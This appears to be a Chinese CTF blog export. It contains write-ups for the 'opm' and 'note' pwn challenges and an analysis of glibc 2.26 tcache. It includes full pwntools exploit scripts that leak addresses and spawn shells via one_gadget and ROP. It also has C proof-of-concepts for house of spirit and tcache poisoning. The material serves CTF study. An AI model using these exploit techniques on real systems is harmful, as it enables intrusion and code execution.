    <content type="text"><![CDATA[opm题目分析本题逻辑比较清晰，仅有两个功能，添加成员和展示全部成员两个功能。 其中，在BSS段上维护了一个数组，用于存储成员的数据结构。该数据结构包括两个从堆上申请的数据块组成。 分别是定长为0x30（new（0x20））的节点，和由malloc（len(s)）申请的动态节点构成。 12340 8 16 24 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| function ptr | address | length | int |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 添加用户函数主要就是维护这个变量 展示全部成员就是利用function ptr来打印全部成员变量的内容。 漏洞利用此题在add_role函数中，十分明显的使用gets(s)留出了两个栈溢出漏洞，但是此题开启了全部保护，让所有地址均位置。并且gets函数有一个非常明显的弊端，会在输入的最后加入’\0’，泄露更加困难。 其实，这道题主要考察堆地址的构造，因为和堆块大小关系并不大。 堆地址泄露首先，申请一个较大的块，保证不出现溢出，这样使下一块分配地址是，输入内容部分会申请得到以00结尾的字符串。 然后，申请一个包含溢出的块，如’b’*0x80+’\x20’，如此一来，会把本来要写到节点堆块的数据向上写入，写到以0020结尾的段地址空间去，由于此题在前方已申请了大量空间，所以保证以0020为结尾的块，不会出现由于未mmap，导致的段错误。这样相当于在一个末位2字节已知的地址，写入了第二个数据结构内容部分的地址。 然后，申请一个刚好为0x80的块，如’c’*0x80，这样，gets输入的\0会覆盖要写入的地址，这样就会将地址写入到最低一字节为00的地址去，根据堆地址的构造，这个地方恰好属于第二个块的内容部分，且被’b’填充，当写入后，如果可以利用printf等函数打印出第二个块内容，就可以成功泄露堆地址了。当然，直接show一定是不行的。 最后，再次申请一个数据块，在第一部分输入内容时并不溢出而在第二个输入数字处溢出一个字节，使这个地址变成第二个块地址写入的0020结尾的地址，此题恰好保证分配过程中前6字节数据不变，在写入int后，就会执行打印操作，也就是打印第二块的内容，顺便打印出了堆地址。 1234add('a'*0x78,1)add('b'*0x80+'\x20',2)add('c'*0x80,3)add('d'*0x18,'d'*0x80+'\x20') 有了堆地址以后，相当于堆分配的全部地址均可预测。(所谓预测，就是写到每步的时候动态调一下，然后直接找当时的内存做减法) ###PIE泄露 首先，可以利用堆地址反向解析出第一块自定义的存储print函数的堆块地址，将这个写入到某堆块内容中去，而这个新申请堆块的值也是可以预测的，因此，再申请一块堆，使其溢出溢出到前一个内容块的地址-0x08处去，相当于在前一块堆上构造了一个伪造的节点，这样就可以泄露print函数的地址，也就相当于PIE地址。 libc地址泄露与PIE泄露类似，通过PIE，可以获取puts函数的got表地址，利用这个地址已经同样的泄露方法，可以获取libc的地址。 控制流劫持控制流劫持的方法与这个方法一样，同样在堆上构造一个伪造的块，其中填入one_gadget的地址，再次申请一个堆块，覆盖返回值为上一块的内容，最后调用show函数，就可以执行one_gadget了，从而拿到shell。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *from ctypes import *debug = 1elf = ELF('./opm')if debug: p = process('./opm') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('39.107.33.43', 13572) context.log_level = 'debug'def add(name,punch): p.recvuntil('(E)xit\n') p.sendline('A') p.recvuntil('name:\n') p.sendline(name) p.recvuntil('punch?\n') p.sendline(str(punch))def show(): p.recvuntil('(E)xit\n') p.sendline('S') add('a'*0x78,1)add('b'*0x80+'\x20',2)add('c'*0x80,3)add('d'*0x18,'d'*0x80+'\x20')p.recvuntil('&lt;bbbbbbbb')heap_addr = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00'))print '[*] heap : ', hex(heap_addr)offset = 0x0000561b9016ec20 - 0x561b9016edc0print_addr1 = heap_addr + offsetoffset2 = 0x55f94cef9ed0 - 0x55f94cef9dc0print '[*] ptr_addr : ', hex(print_addr1)add(p64(print_addr1),'4')add('e'*10 , 'e'*0x80 + p64(heap_addr + offset2 -8))p.recvuntil('&lt;')PIE = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00')) - 0XB30print '[*] pie : ', hex(PIE)add(p64(PIE+elf.got['puts']),'5')offset3 = 0x55f960027f70 - 0x55f960027dc0add('f'*10 , 'f'*0x80 + p64(heap_addr + offset3 -8))p.recvuntil('&lt;')libc.address = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00')) - libc.symbols['puts']print '[*] system : ', hex(libc.symbols['system'])add(p64(libc.address + 0x4526a),'6')block_exploit = heap_addr +0x5608f0cd5010 - 0x5608f0cd4dc0add('/bin/sh\0'+'\x00'*0x78 + p64(block_exploit) ,1)gdb.attach(p)p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' note题目分析此题最开始发现是标准的socket + fork写法，这样写法通常是会爆破canary或者地址，但是note这题暂时没用上。 经AAA战队的大佬提醒，在note2题目中会用到，to becontinue… 直接来看fork之后的函数，首先就是会getpwnam(”note“)操作，调试的时候，直接新建一个这个用户就能过了.. 关键函数中，主要申请了3块内存 对于title这个变量，是有限制的，遇到0x26232722403f210a任意一个时会截断，这样截断后会在堆块末尾写入这个截断值，此时会有一个溢出（off-by-one）。 对于content变量，理论上智能改变3次，使用realloc进行扩容或者缩小。并且提供打印功能。 对于comment变量是任意写的。 漏洞利用此题比较特殊的点在于题目没有free，当没有free时，就需要创造free了… 通过阅读realloc代码，可以发现其处理逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051else &#123; /* Try to expand forward into top */ if (next == av-&gt;top &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb + MINSIZE)) &#123; ... &#125; /* Try to expand forward into next chunk; split off remainder below */ else if (next != av-&gt;top &amp;&amp; !inuse (next) &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb)) &#123; newp = oldp; unlink (av, next, bck, fwd); &#125; /* allocate, copy, free */ else &#123; ** newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK); if (newmem == 0) return 0; /* propagate failure */ newp = mem2chunk (newmem); newsize = chunksize (newp); /* Avoid copy if newp is next chunk after oldp. */ if (newp == next) &#123; newsize += oldsize; newp = oldp; &#125; else &#123; /* Unroll copy of &lt;= 36 bytes (72 if 8byte sizes) We know that contents have an odd number of INTERNAL_SIZE_T-sized words; minimally 3. */ ...... ** _int_free (av, oldp, 1); check_inuse_chunk (av, newp); return chunk2mem (newp); &#125; 在标**的行发现，realloc当想要拓展当前块的时候，会检查下一块释放被占用，如果被占用，则会利用int_malloc函数申请一个新的堆块，并且释放原来占用的堆块。 分析一下现状： 存在一个指针数组在bss段上，指针会指向堆地址 存在off-by-one，可以修改content所在堆块大小，但只能修改为特定值，且小于原来的堆块大小 content前块和后块内容均可以任意写 想到的一个思路是unlink，这样就可以劫持bss段的数组进而可以任意读任意写。 首先，想到content块会变小，如果与后面的堆空间unlink，会过不去libc的检测，因为没有指针指向后块地址，因此需要选择前块作为unlink的目标块，则size需要覆盖为pre_inuse为0的值（0x40），选定了这个值以后，前块的fake chunk就可以构造了。 然后，需要思考如何触发unlink。在第一次realloc时，libc会将改小的堆块放到fastbin中去，而这时需要如何触发unlink呢？ 在查看代码中发现，malloc_consolidate函数会对fastbin链中各个堆块进行遍历，对符合前后块！inuse的堆块做unlink，这样恰好符合需求。 在什么时候会触发malloc_consolidate呢？在_int_malloc 中发现，在申请较大堆块，导致前面的一系列分配均无法满足时，会触发该函数。因此，我选择申请0x21000大小的堆块，该堆块大于brk分配的初始堆大小，则一定可以触发malloc_consolidate 12345678910111213141516171819... /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else &#123; idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); &#125;... 剩下的步骤，就是如何构造前后堆块使其在malloc_consolidate中可以通过系统的check了。 当这一步完成时，在bss段上的指针数组里，就出现交叉的情况了，通过编辑title内容，就可以对bss段数组上的数据任意写，并且可以写多次。 首先利用got表泄露libc地址，然后再泄露libc中environ变量的地址（栈地址），最后对返回地址写入rop，就可以拿到shell了（其实最简单的方法是对__malloc_hook写one_gadget，但测试过程中，libc的四个one_gadget均不可用…） EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from ctypes import *debug = 0elf = ELF('./note')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = remote('127.0.0.1', 1234)#process('./300') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('39.107.14.183', 1234) libc = ELF('./libc-2.23.so') #off = 0x001b0000 context.log_level = 'debug'def change_title(title): p.recvuntil('--&gt;&gt;') p.sendline('1') p.recvuntil('title:') p.send(title)def change_content(size,content): p.recvuntil('--&gt;&gt;') p.sendline('2') p.recvuntil('(64-256):') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def change_comment(content): p.recvuntil('--&gt;&gt;') p.sendline('3') p.recvuntil('comment:') p.sendline(content)def show_content(): p.recvuntil('--&gt;&gt;') p.sendline('4')p.recvuntil('welcome to the note ')offset = int(p.recv(4),10)print '[*]', str(offset + 0x10),hex(offset +0x10)change_content(0x78,p64(0x41)*(8)+p64(0x80)*7+'\n')change_title(p64(0x11)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'@')change_content(150,'a'*110+'\n')change_title(p64(offset+0x10-0x20)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'a')change_content(0x21000,'a'*110+'\n')change_title(p64(0x602058)+p64(elf.got['puts'])+p64(0x78)+p64(0x602058)+'\n')show_content()p.recvuntil('is:')libc.address = u64(p.recv(6).ljust(8,'\0')) - libc.symbols['puts']print '[+] system: ',hex(libc.symbols['system'])change_comment(p64(0x602058)+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')show_content()p.recvuntil('is:')stack_addr = u64(p.recv(6).ljust(8,'\0'))print '[+] stack: ',hex(stack_addr)offset = 0x7fffffffe4b8- 0x7fffffffe338 change_comment(p64(stack_addr - offset )+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')change_comment(p64(0x0000000000401673)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))p.interactive()'''Gadgets information============================================================0x000000000040166c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040166e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401670 : pop r14 ; pop r15 ; ret0x0000000000401672 : pop r15 ; ret0x000000000040166b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040166f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400e00 : pop rbp ; ret0x0000000000401673 : pop rdi ; ret0x0000000000401671 : pop rsi ; pop r15 ; ret0x000000000040166d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c71 : ret0x00000000004002c1 : ret 0x2000x0000000000401300 : ret 0x89480x00000000004012f6 : ret 0x8b480x0000000000400fe5 : ret 0xb60fUnique gadgets found: 15''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache 源码分析及利用思路]]></title>
    <url>%2F2018%2F03%2F20%2Ftcache%2F</url>
    <content type="text"><![CDATA[tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。 总体简介tcache是一个用于加速malloc分配的缓存结构，有由64个链表组成。其优先级很高，会先于全部的bin来处理。每个链表的个数是一定的，当缓存链表装满时，分配方式就与之前版本的malloc相同。但使用了tcache版本的malloc与free函数时，对于堆块的安全性检查就相比于之前的版本弱化很多。 本文依据的代码是libc 2.26，最新出的libc 2.27似乎与2.26相差不多，多了一个SINGLE_THREAD_P变量，用于细化单线程与多线程的处理逻辑，对此研究不深。 数据结构tcache增加了两个全新的结构体，tcache_entry、tcache_perthread_struct。并且在libc内部定义了两个线程局部变量，该局部变量使得在每一个线程内部维护一个tcache结构，当在某线程内部释放内存时，无论内存块属于哪个分配区，都会挂到释放该内存块线程的tcache中。 tcache_entry结构体，看上去并不明白是做什么用的，但在分析代码中发现，这就是一个单链表结构指针。 tcache_pthread_struct结构体，是一个线程tcache的主体，由两个数组组成。其中，entries数据代表tcache的各个链表，共TCACHE_MAX_BINS个（默认为64），counts数组代表每一个单链表内有多少个内存块。 这个tcache结构的组装与fastbin非常相似 1234567891011121314typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread char tcache_shutting_down = 0;static __thread tcache_perthread_struct *tcache = NULL; 常量定义：从常量中可以看出，默认配置情况下，结构体最多的单链表个数是64个，每个单链表中最多有7个内存块，可容纳的最大内存块大小是1032。 1234567891011121314151617181920# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When "x" is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When "x" is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. *//* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 生成与调试这部分应该写在下一部分，不过在我刚开始动手调试时就遇到了问题，就是 __thread 变量的问题，这个变量是线程内访问的，所以当我在gdb中使用 p tcache 命令输出结构体时出现了错误： 12Cannot find thread-local storage for process 27690, shared library /lib/x86_64-linux-gnu/libc.so.6:Cannot find thread-local variables on this target 就很懵，调试时不能查看结构体数值不就很蛋疼么。。。然后在博客内请教了大佬，还没回我，我就继续分析代码，找到了解决问题的方法（如果有人知道如何直接查看，麻烦告知我） 在代码中发现了一个初始化函数 tcache_init() 12345678910111213141516171819202122232425262728293031323334static voidtcache_init(void)&#123; mstate ar_ptr; void *victim = 0; const size_t bytes = sizeof (tcache_perthread_struct); if (tcache_shutting_down) return; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim &amp;&amp; ar_ptr != NULL) &#123; ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); /* In a low memory situation, we may not be able to allocate memory - in which case, we just keep trying later. However, we typically do this very early, so either there is sufficient memory, or there isn't enough memory to do non-trivial allocations anyway. */ if (victim) &#123; tcache = (tcache_perthread_struct *) victim; memset (tcache, 0, sizeof (tcache_perthread_struct)); &#125;&#125; 发现tcache是一个指针，而内存块居然是用_int_malloc生成的，这就是说我们可以不管这个线程局部变量，直接去找这块内存就好了。 继续跟踪函数调用，过程是 1234malloc __libc_malloc MAYBE_INIT_TCACHE tcache_init 而MAYBE_INIT_TCACHE的位置在arena_get之前，并且tcache_init中还包含arena_get函数。结合上一篇对于内存堆分配区的知识，这就可以判断，在对线程的分配区初始化之后，第一个分配的内存就是tcache内存块。 在主分配区该结构是heap段第一块内存，在非主分配应该在sub_heap和thread_state结构体以后 因此首先用vmmap 找到heap地址之后，就可以查看该结构体内容了，进而可以继续调试 1234567891011121314151617181920212223242526pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r-xp 1000 0 /home/p4nda/Desktop/1 0x555555754000 0x555555755000 r--p 1000 0 /home/p4nda/Desktop/1 0x555555755000 0x555555756000 rw-p 1000 1000 /home/p4nda/Desktop/1 0x555555756000 0x555555777000 rw-p 21000 0 [heap] 0x7ffff79f5000 0x7ffff7bcb000 r-xp 1d6000 0 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1da000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7fe0000 0x7ffff7fe2000 rw-p 2000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]pwndbg&gt; p *(struct tcache_perthread_struct *)0x555555756000$1 = &#123; counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;&#125;pwndbg&gt; 堆分配差异当加入了tcache机制后，原来的ptmalloc的堆块释放与分配机制存在一定的改变，先看两个函数tcache_get、tcache_put，可以看出这两个函数与fastbin的取出和插入基本完全一样。 12345678910111213141516171819202122static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; 内存块放入tcache内存释放可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。 12345678910111213141516171819202122232425262728293031323334353637383940414243_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by "design" from some intruder. */ if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr ("free(): invalid pointer"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); check_inuse_chunk(av, p);#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif......&#125; 内存申请在内存分配的malloc函数中有多处，会将内存块移入tcache中。 首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。 其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。 还有，当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。 （高能预警：代码经过剪切，仍然很长… ） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171static void *_int_malloc (mstate av, size_t bytes)&#123;... 变量定义 ...#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif... ======= 1. 申请块符合fastbin块大小 ======== if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125;======= 2. 申请块符合smallbin块大小 ======== if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125;...#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif====== 循环处理unsorted bin内存块 ======== for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;...... if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;...... &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125;...&#125; 内存块从tcache中取出直接分配在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes = request2size (bytes); size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); ....&#125; 最大值限制在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。 1234567891011#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif unsorted bin处理结束在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。 1234567#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif ​ 利用方式house_of_spirit当tcache存在时，释放堆块没有对堆块的前后堆块进行合法性校验，只需要构造本块对齐就可以成功将任意构造的堆块释放到tcache中，而在申请时，tcache对内部大小合适的堆块也是直接分配的，并且对于在tcache内任意大小的堆块管理方式是一样的，导致常见的house_of_spirit可以延伸到smallbin。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt;typedef size_t INTERNAL_SIZE_T;struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;;typedef struct malloc_chunk* mchunkptr;int main(int argc, const char* argv[]) &#123; size_t fake_chunk_and_more[64]; void (* c)(char *) ; fake_chunk_and_more[5] = (size_t )puts; //If a funtion ptr stored here... printf("This example showcases how the House of Spirit became more powerful " \ " after the tcache patch\n"); printf("Filling space at and after the fake chunk with invalid data\n"); memset(fake_chunk_and_more, 'A', sizeof(fake_chunk_and_more)); printf("Building fake chunk on the stack at %p\n", (void *)fake_chunk_and_more); mchunkptr fake_chunk = (mchunkptr)(void *)fake_chunk_and_more; fake_chunk-&gt;size = 0x90; void *mem = (void*)((char*)fake_chunk + offsetof(struct malloc_chunk, fd)); free(mem); printf("Passed chunk to free, let's make an allocation for the fake size\n"); size_t *mem2 = malloc(0x80); mem2[3] = (size_t )system; printf("malloc(0x80) returned: %p\n", mem2); c = fake_chunk_and_more[5]; (*c)("/bin/sh"); return 0;&#125; tcache链表劫持可以发现，tcache链表的插入和摘除方式与fastbin是基本一致的，也同样可以对tcache的链表进行劫持，并且，由于分配内存时对size没有任何校验。因此，比fastbin dup更容易利用。 1234567891011121314151617181920212223242526272829303132#include &lt;malloc.h&gt;#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;size_t *chunksizep(void *mem) &#123; return (size_t *)(((char *)mem) - sizeof(size_t));&#125;int main(int argc, const char* argv[]) &#123; void (* c[6])(char *) ; printf("If there is a function ptr array here: %p\n",c); c[3] = puts; void *mem = malloc(0x80); printf("malloc a chunk here , %p. then free it\n ",mem); tcache_entry *victim = (tcache_entry *)mem; free(mem); victim-&gt;next = (void *)c; size_t *mem1 = malloc(0x80); size_t *mem2 = malloc(0x80); printf("malloc twice,get addr 1: %p,2: %p\n",mem1,mem2); mem2[3] = (size_t )system; (*c[3])("/bin/sh"); return 0;&#125; 